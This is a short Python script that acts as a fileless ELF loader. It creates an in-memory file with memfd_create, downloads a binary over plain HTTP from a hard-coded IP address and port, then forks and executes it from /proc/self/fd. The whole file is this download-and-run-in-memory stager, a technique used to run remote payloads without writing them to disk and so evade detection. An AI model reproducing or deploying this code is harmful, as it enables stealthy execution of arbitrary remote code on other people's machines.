import os
import requests

# What has to be done
# - Create file descriptor (FD) -- DONE
# - Read ELF contents from Webserver (Location of FD will be: /proc/self/fd/)
# - Write ELF content to FD -- DONE
# - Execute file (Location of FD will be: /proc/self/fd/)

def createFD():
    fd = os.memfd_create("testProcess", 0)
    return fd

def getFileContent():
    req = requests.get("http://192.168.146.133:8082/elfContent")
    return req.content

def writeToFD(fd, content):
    with open(f"/proc/self/fd/{fd}", "wb") as f:
        f.write(content)


def loadInMem(fd, args):
    print("[INFO] - Spawning the child process")
    childPid = os.fork()

    if childPid == -1:
        print("[INFO] - Could not start child process")
        exit()

    elif childPid == 0:
        fPath = f"/proc/self/fd/{fd}"
        args.insert(0, fPath)

        os.execve(fPath, args, dict(os.environ))

args = []
fd = createFD();

if fd != 0:
    print(f"[INFO] - File descriptor: {fd}")

else:
    print("[INFO] - File descriptor creation failed")

elfContent = getFileContent()
writeToFD(fd, elfContent)
loadInMem(fd, args)
